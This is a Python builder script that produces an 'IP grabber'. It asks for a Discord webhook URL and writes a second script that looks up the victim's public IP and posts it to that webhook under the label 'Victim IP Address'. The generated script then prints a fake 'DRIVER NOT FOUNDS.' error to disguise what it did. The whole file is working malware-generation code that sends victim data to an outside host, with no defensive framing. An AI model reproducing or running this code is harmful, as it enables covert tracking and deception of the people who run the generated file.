import os
import requests
import socket
import colorama
from colorama import Fore
import os
import subprocess
import time
import webbrowser
from pystyle import Center, Colorate, Colors, Anime
import colorama
import os

os.system('cls')
print(Colorate.Horizontal(Colors.blue_to_cyan,"""
▄▄▄▄  ▄▄▄  ▄▄▄▄                                 
▀███  ███  ███▀                                 
 ███  ███  ███ ██ ██ ███▄███▄ ████▄ ██ ██ ▄█▀▀▀ 
 ███▄▄███▄▄███ ██ ██ ██ ██ ██ ██ ██ ██ ██ ▀███▄ 
  ▀████▀████▀  ▀██▀█ ██ ██ ██ ████▀ ▀██▀█ ▄▄▄█▀ 
                              ██                
                              ▀▀                

                ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
                ┃ Author : Wumpus             ┃
                ┃ Discord: .gg/datas          ┃
                ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
                          
"""))
webhook_url = input(Fore.BLUE + "Webhook URL: " + Fore.CYAN)
file_name = input("Name (without .py): ") + ".py"

script_content = f'''# -*- coding: utf-8 -*-
import requests


def get_public_ip():
    response = requests.get('https://api.ipify.org?format=json')
    return response.json()['ip']


def send_ip_to_webhook():
    ip = get_public_ip()
    webhook_url = "{webhook_url}"
    data = {{"content": f"# Beluga | By Ace \\nVictim IP Address: {{ip}}" }}
    response = requests.post(webhook_url, json=data)
    
    # Vérification de la réponse
    if response.status_code == 204:
        print("DRIVER NOT FOUNDS.")
    else:
        print(f"DRIVER NOT FOUNDS.")


if __name__ == "__main__":
    send_ip_to_webhook()
'''

with open(file_name, 'w', encoding='utf-8') as file:
    file.write(script_content)

print(f"{file_name} has been created. Good grab!")
input(Fore.RED + "PRESS ENTER TO EXIT...")









